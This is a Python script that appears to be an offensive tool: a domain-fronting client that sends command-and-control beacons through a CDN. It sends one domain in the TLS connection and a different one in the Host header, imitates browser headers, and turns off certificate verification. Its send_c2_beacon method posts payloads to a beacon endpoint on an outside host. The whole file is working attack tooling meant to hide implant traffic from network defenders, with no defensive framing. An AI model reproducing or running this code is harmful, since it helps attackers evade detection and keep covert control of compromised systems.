import argparse

import requests
from urllib3.util.ssl_ import create_urllib3_context
import ssl


class DomainFrontingClient:
    def __init__(self, cdn_domain, front_domain, c2_host):
        self.cdn_domain = cdn_domain
        self.front_domain = front_domain
        self.c2_host = c2_host
        self.session = requests.Session()

    def build_request(self, path, data=None):
        url = "https://{}/{}".format(self.cdn_domain, path.lstrip("/"))
        headers = {
            "Host": self.front_domain,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }
        if data is not None:
            headers["Content-Type"] = "application/json"
        return {
            "url": url,
            "headers": headers,
            "data": data,
        }

    def send_request(self, request_data):
        url = request_data["url"]
        headers = request_data["headers"]
        data = request_data.get("data")
        try:
            response = self.session.post(
                url,
                headers=headers,
                json=data,
                timeout=15,
                verify=False,
            )
            return response
        except requests.RequestException:
            return None

    def parse_response(self, response):
        if response is None:
            return None
        try:
            return response.json()
        except ValueError:
            return {
                "status_code": response.status_code,
                "body": response.text[:1024],
            }

    def send_c2_beacon(self, payload):
        req = self.build_request("/api/v1/beacon", data=payload)
        req["headers"]["X-Custom"] = "fronted"
        response = self.send_request(req)
        return self.parse_response(response)

    def build_tls_context(self):
        ctx = create_urllib3_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx


def main():
    parser = argparse.ArgumentParser(description="Domain Fronting Client")
    parser.add_argument("--cdn-domain", required=True, help="CDN domain for TLS SNI")
    parser.add_argument("--front-domain", required=True, help="Front domain for Host header")
    parser.add_argument("--c2-host", required=True, help="C2 server hostname or IP")
    parser.add_argument("--path", default="/api/v1/beacon", help="Request path")
    parser.add_argument("--test", action="store_true", help="Test request building")
    args = parser.parse_args()

    client = DomainFrontingClient(
        cdn_domain=args.cdn_domain,
        front_domain=args.front_domain,
        c2_host=args.c2_host,
    )

    if args.test:
        req = client.build_request(args.path, data={"test": True})
        print("Request URL:  {}".format(req["url"]))
        print("Host header:  {}".format(req["headers"]["Host"]))
        print("SNI (TLS):   {}".format(args.cdn_domain))
        print("Front domain: {}".format(args.front_domain))
    else:
        payload = {"action": "beacon", "data": "test"}
        response = client.send_c2_beacon(payload)
        print("Response: {}".format(response))


if __name__ == "__main__":
    main()
